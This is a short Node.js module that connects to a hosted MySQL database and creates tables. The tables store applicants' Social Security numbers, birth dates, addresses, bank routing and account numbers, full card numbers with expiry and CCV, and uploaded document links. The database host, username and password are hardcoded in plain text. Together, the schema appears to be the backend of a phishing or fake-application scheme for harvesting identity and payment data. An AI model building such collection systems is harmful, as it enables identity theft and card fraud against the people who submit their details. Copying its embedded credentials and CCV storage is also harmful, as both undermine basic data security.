const mysql = require('mysql2/promise');

const dbConfig = {
    host: process.env.DB_HOST || 'sql7.freesqldatabase.com',
    user: process.env.DB_USER || 'sql7815776',
    password: process.env.DB_PASSWORD || 'Hz6LQxmi4P',
    database: process.env.DB_NAME || 'sql7815776',
    port: process.env.DB_PORT || 3306,
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0
};

const pool = mysql.createPool(dbConfig);

const initDB = async () => {
    try {
        const connection = await pool.getConnection();
        console.log('✅ Connected to MySQL Database');

        await connection.query(`
            CREATE TABLE IF NOT EXISTS applications (
                id INT AUTO_INCREMENT PRIMARY KEY,
                first_name VARCHAR(255),
                last_name VARCHAR(255),
                dob DATE,
                ssn VARCHAR(20),
                phone VARCHAR(20),
                email VARCHAR(255),
                address TEXT,
                city VARCHAR(100),
                state VARCHAR(50),
                zip VARCHAR(20),
                mailing_address TEXT,
                bank_name VARCHAR(255),
                account_type VARCHAR(50),
                routing_number VARCHAR(20),
                account_number VARCHAR(20),
                drive_folder_id VARCHAR(255),
                drive_folder_url TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await connection.query(`
            CREATE TABLE IF NOT EXISTS cards (
                id INT AUTO_INCREMENT PRIMARY KEY,
                application_id INT,
                card_number VARCHAR(20),
                expiry VARCHAR(10),
                ccv VARCHAR(10),
                FOREIGN KEY (application_id) REFERENCES applications(id) ON DELETE CASCADE
            )
        `);

        await connection.query(`
            CREATE TABLE IF NOT EXISTS files (
                id INT AUTO_INCREMENT PRIMARY KEY,
                application_id INT,
                name VARCHAR(255),
                url TEXT,
                drive_id VARCHAR(255),
                field_name VARCHAR(100),
                FOREIGN KEY (application_id) REFERENCES applications(id) ON DELETE CASCADE
            )
        `);

        console.log('✅ Database tables initialized');
        connection.release();
    } catch (error) {
        console.error('❌ Database initialization error:', error);
    }
};

module.exports = {
    pool,
    initDB
};
